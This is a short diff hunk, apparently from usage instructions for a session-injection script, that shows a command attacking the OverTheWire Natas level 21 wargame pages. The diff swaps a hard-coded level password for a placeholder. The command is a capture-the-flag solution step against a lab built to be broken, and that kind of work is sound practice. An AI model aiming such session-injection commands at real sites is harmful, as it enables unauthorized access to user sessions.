@@ -92,7 +92,7 @@ python3 session_injector.py \
   --inject-url http://natas21-experimenter.natas.labs.overthewire.org/index.php \
   --read-url   http://natas21.natas.labs.overthewire.org/index.php \
   --user natas21 \
-  --password BPhv63cKE1lkQl04cE5CuFTzXe15NfiH \
+  --password <PASSWORD> \
   --require-submit \
   --submit-key submit \
   --submit-value 1 \
